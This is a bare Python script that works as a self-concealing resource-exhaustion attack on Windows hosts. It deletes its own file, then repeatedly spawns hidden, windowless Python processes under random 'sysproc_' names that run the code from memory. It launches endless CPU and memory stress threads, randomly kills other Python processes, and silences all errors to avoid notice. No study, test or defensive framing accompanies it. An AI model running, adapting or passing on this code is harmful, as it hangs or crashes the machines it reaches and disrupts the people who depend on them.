import sys
import random
import string
import psutil
import subprocess
import io
import time
import threading
import os
from multiprocessing import Process

def generate_process_name(size=6):
    return 'sysproc_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=size))

def load_script_code():
    with open(sys.argv[0], 'r') as f:
        code = f.read()
    os.remove(sys.argv[0])
    return code

def execute_in_memory(code):
    proc_name = generate_process_name()
    mem_stream = io.StringIO(code)
    subprocess.Popen([sys.executable, '-c', f'import sys; sys.argv[0]="{proc_name}"; exec(sys.stdin.read())'], stdin=mem_stream, creationflags=subprocess.CREATE_NO_WINDOW)

def stress_cpu():
    while True:
        try:
            result = [i * i for i in range(1000000)]
            time.sleep(random.uniform(0.2, 1.5))
        except:
            pass

def stress_memory():
    while True:
        try:
            block = [0] * (1024 * 1024 * random.randint(10, 30))
            time.sleep(random.uniform(0.3, 2))
        except:
            pass

def process_manager(code):
    while True:
        try:
            for _ in range(random.randint(2, 6)):
                p = Process(target=execute_in_memory, args=(code,))
                p.start()
            if random.random() < 0.2:
                t = threading.Thread(target=stress_cpu)
                t.daemon = True
                t.start()
            if random.random() < 0.25:
                t = threading.Thread(target=stress_memory)
                t.daemon = True
                t.start()
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in ['python.exe', 'pythonw.exe']:
                    if random.random() < 0.04:
                        proc.kill()
            time.sleep(random.uniform(0.3, 2.5))
        except:
            pass

if __name__ == '__main__':
    try:
        script_code = load_script_code()
    except:
        script_code = ''
    thread_list = []
    for _ in range(6):
        t = threading.Thread(target=process_manager, args=(script_code,))
        t.daemon = True
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
